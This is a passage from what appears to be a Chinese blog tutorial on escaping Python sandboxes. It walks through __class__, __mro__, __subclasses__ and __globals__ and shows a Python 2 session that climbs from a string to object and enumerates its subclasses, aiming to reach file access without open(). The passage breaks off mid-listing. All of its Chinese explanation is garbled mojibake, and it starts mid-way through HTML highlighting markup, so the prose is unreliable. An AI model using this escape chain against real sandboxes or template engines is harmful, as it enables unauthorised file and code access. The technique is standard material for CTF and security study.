punctuation">,</span> <span class="token string">'UserWarning'</span><span class="token punctuation">,</span> <span class="token string">'ValueError'</span><span class="token punctuation">,</span> <span class="token string">'Warning'</span><span class="token punctuation">,</span> <span class="token string">'ZeroDivisionError'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'__build_class__'</span><span class="token punctuation">,</span> <span class="token string">'__debug__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">,</span> <span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'all'</span><span class="token punctuation">,</span> <span class="token string">'any'</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">,</span> <span class="token string">'bin'</span><span class="token punctuation">,</span> <span class="token string">'bool'</span><span class="token punctuation">,</span> <span class="token string">'breakpoint'</span><span class="token punctuation">,</span> <span class="token string">'bytearray'</span><span class="token punctuation">,</span> <span class="token string">'bytes'</span><span class="token punctuation">,</span> <span class="token string">'callable'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'classmethod'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'complex'</span><span class="token punctuation">,</span> <span class="token string">'copyright'</span><span class="token punctuation">,</span> <span class="token string">'credits'</span><span class="token punctuation">,</span> <span class="token string">'delattr'</span><span class="token punctuation">,</span> <span class="token string">'dict'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'divmod'</span><span class="token punctuation">,</span> <span class="token string">'enumerate'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'filter'</span><span class="token punctuation">,</span> <span class="token string">'float'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'frozenset'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">,</span> <span class="token string">'hasattr'</span><span class="token punctuation">,</span> <span class="token string">'hash'</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'int'</span><span class="token punctuation">,</span> <span class="token string">'isinstance'</span><span class="token punctuation">,</span> <span class="token string">'issubclass'</span><span class="token punctuation">,</span> <span class="token string">'iter'</span><span class="token punctuation">,</span> <span class="token string">'len'</span><span class="token punctuation">,</span> <span class="token string">'license'</span><span class="token punctuation">,</span> <span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token string">'locals'</span><span class="token punctuation">,</span> <span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'memoryview'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'oct'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'property'</span><span class="token punctuation">,</span> <span class="token string">'quit'</span><span class="token punctuation">,</span> <span class="token string">'range'</span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">,</span> <span class="token string">'reversed'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'set'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">,</span> <span class="token string">'slice'</span><span class="token punctuation">,</span> <span class="token string">'sorted'</span><span class="token punctuation">,</span> <span class="token string">'staticmethod'</span><span class="token punctuation">,</span> <span class="token string">'str'</span><span class="token punctuation">,</span> <span class="token string">'sum'</span><span class="token punctuation">,</span> <span class="token string">'super'</span><span class="token punctuation">,</span> <span class="token string">'tuple'</span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">,</span> <span class="token string">'vars'</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">]</span></code></pre>
çœ‹å¤šå¥½å¤šç†Ÿæ‚‰çš„å‡½æ•°ï¼Œinputã€strã€lenã€powç­‰å‡½æ•°
è¿™æ ·å°±è§£é‡Šå¾—é€šä¸ºä»€ä¹ˆæ‰“å¼€pythonè§£é‡Šå™¨ä¸ç”¨å…ˆimportå¯¼å…¥æ¨¡å—å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€äº›å‡½æ•°äº†ã€‚
### ç±»çš„ç»§æ‰¿
pythonä¸­å¯¹ä¸€ä¸ªå˜é‡åº”ç”¨classæ–¹æ³•ä»ä¸€ä¸ªå˜é‡å®ä¾‹è½¬åˆ°å¯¹åº”çš„å¯¹è±¡ç±»å‹åï¼Œç±»æœ‰ä»¥ä¸‹ä¸‰ç§å…³äºç»§æ‰¿å…³ç³»çš„æ–¹æ³•
<pre class="language-python" data-language="python"><code class="language-python">__base__ <span class="token operator">//</span>å¯¹è±¡çš„ä¸€ä¸ªåŸºç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯<span class="token builtin">object</span>ï¼Œæœ‰æ—¶ä¸æ˜¯ï¼Œè¿™æ—¶éœ€è¦ä½¿ç”¨ä¸‹ä¸€ä¸ªæ–¹æ³•

__mro__ <span class="token operator">//</span>åŒæ ·å¯ä»¥è·å–å¯¹è±¡çš„åŸºç±»ï¼Œåªæ˜¯è¿™æ—¶ä¼šæ˜¾ç¤ºå‡ºæ•´ä¸ªç»§æ‰¿é“¾çš„å…³ç³»ï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œ<span class="token builtin">object</span>åœ¨æœ€åº•å±‚æ•…åœ¨åˆ—è¡¨ä¸­çš„æœ€åï¼Œé€šè¿‡__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>å¯ä»¥è·å–åˆ°

__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span>ç»§æ‰¿æ­¤å¯¹è±¡çš„å­ç±»ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨</code></pre>
æœ‰è¿™äº›ç±»ç»§æ‰¿çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»ä»»ä½•ä¸€ä¸ªå˜é‡ï¼Œå›æº¯åˆ°åŸºç±»ä¸­å»ï¼Œå†è·å¾—åˆ°æ­¤åŸºç±»æ‰€æœ‰å®ç°çš„ç±»ï¼Œå°±å¯ä»¥è·å¾—åˆ°å¾ˆå¤šçš„ç±»ã€‚
### ä¸€äº›é­”æœ¯å‡½æ•°
`__dict__`ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„`__dict__`é‡Œçš„å¯¹è±¡çš„`__dict__`ä¸­å­˜å‚¨äº†ä¸€äº›self.xxxçš„ä¸€äº›ä¸œè¥¿å†…ç½®çš„æ•°æ®ç±»å‹æ²¡æœ‰`__dict__`å±æ€§æ¯ä¸ªç±»æœ‰è‡ªå·±çš„`__dict__`å±æ€§ï¼Œå°±ç®—å­˜åœ¨ç»§æ‰¿å…³ç³»ï¼Œçˆ¶ç±»çš„`__dict__` å¹¶ä¸ä¼šå½±å“å­ç±»çš„`__dict__`å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„`__dict__`å±æ€§ï¼Œ å­˜å‚¨`self.xxx` ä¿¡æ¯ï¼Œçˆ¶å­ç±»å¯¹è±¡å…¬ç”¨`__dict__`
`__globals__`è¯¥å±æ€§æ˜¯å‡½æ•°ç‰¹æœ‰çš„å±æ€§,è®°å½•å½“å‰æ–‡ä»¶å…¨å±€å˜é‡çš„å€¼,å¦‚æœæŸä¸ªæ–‡ä»¶è°ƒç”¨äº†osã€sysç­‰åº“,ä½†æˆ‘ä»¬åªèƒ½è®¿é—®è¯¥æ–‡ä»¶æŸä¸ªå‡½æ•°æˆ–è€…æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨`globals`å±æ€§è®¿é—®å…¨å±€çš„å˜é‡ã€‚è¯¥å±æ€§ä¿å­˜çš„æ˜¯å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ã€‚
`__getattribute__()`å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„`__getattribute__`é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼š`a.xxx/a.xxx()`ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨`__getattribute__`æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚
å°±åƒPHPåºåˆ—åŒ–æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨æŸäº›å‡½æ•°ã€‚
### åˆ©ç”¨æ–¹æ³•
æ ¹æ®ä¸Šé¢æåˆ°çš„ç±»ç»§æ‰¿çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºä¸€ä¸ªåˆ©ç”¨æ–¹å¼ï¼ˆè¿™ä¹Ÿæ˜¯pythonæ²™ç›’æº¢å‡ºçš„å…³é”®ï¼‰ï¼šä»å˜é‡->å¯¹è±¡->åŸºç±»->å­ç±»éå†->å…¨å±€å˜é‡ã€‚

å¦‚ä½•æ‰èƒ½åœ¨pythonç¯å¢ƒä¸‹ï¼Œä¸ç›´æ¥ä½¿ç”¨openè€Œæ¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Ÿ
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#python2</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__
<span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span>
<span class="token comment">#å›åˆ°åŸºç±»</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span></code></pre>
å›åˆ°objectåŸºç±»ï¼Œå°±å¯ä»¥äº†ï¼Œç„¶åå¼€å§‹ä¸€å±‚ä¸€å±‚å¯»æ‰¾è¦åˆ©ç”¨çš„å‡½æ•°
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.stat_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">]</span>
<span class="token comment">#ä½¿ç”¨ä¸€ä¸ªforå¾ªç¯æ¥listä¸€ä¸‹(æ–¹ä¾¿æŸ¥çœ‹å’Œè°ƒç”¨)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span> i
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">)</span>
